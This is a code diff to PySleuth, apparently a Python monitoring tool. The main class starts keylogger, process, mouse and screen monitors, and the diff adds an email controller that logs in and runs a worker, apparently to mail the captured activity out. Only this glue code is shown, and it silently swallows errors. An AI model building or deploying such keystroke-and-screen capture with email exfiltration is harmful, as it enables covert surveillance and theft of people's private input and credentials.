@@ -3,24 +3,37 @@ from .controllers import KeyLoggerController
 from .controllers import ProcessMntrController
 from .controllers import MouseMntrController
 from .controllers import ScreenMntrController
+from .controllers import EmailController
 
+
+class Struct:
+    pass
 
 class PySleuth:
+    RUNNING = False
+
     def __init__(self):
-        self._controllers = set()
+        self.ctrls = Struct()
 
         self._initComponents()
 
-    def start(self):
-        for controller in self._controllers:
-            controller.startWorker()
+        self.emailCtrl = None
 
-    def mainLoop(self):
+    def start(self):
+        self.emailCtrl = EmailController(self)
+        self.emailCtrl.login()
+
+        assert self.emailCtrl is not None
+
         try:
-            while True:
-                pass
+            self.emailCtrl.startWorker()
         except KeyboardInterrupt:
             print("\nUser abort!")
+        except Exception as e:
+            pass
+        finally:
+            self.emailCtrl.logout()
+            self.RUNNING = False
 
     def _initComponents(self):
         components = ConfigHandler().getCfgRun()
@@ -38,13 +51,13 @@ class PySleuth:
             self._initScreenMonitor()
 
     def _initKeylogger(self):
-        self._controllers.add(KeyLoggerController(self))
+        setattr(self.ctrls, "keyloggerctrl", KeyLoggerController())
 
     def _initProcessMonitor(self):
-        self._controllers.add(ProcessMntrController(self))
+        setattr(self.ctrls, "procMntrCtrl", ProcessMntrController())
 
     def _initMouseMonitor(self):
-        self._controllers.add(MouseMntrController(self))
+        setattr(self.ctrls, "mouseMntrCtrl", MouseMntrController())
 
     def _initScreenMonitor(self):
-        self._controllers.add(ScreenMntrController(self))
+        setattr(self.ctrls, "screenMntrCtrl", ScreenMntrController())
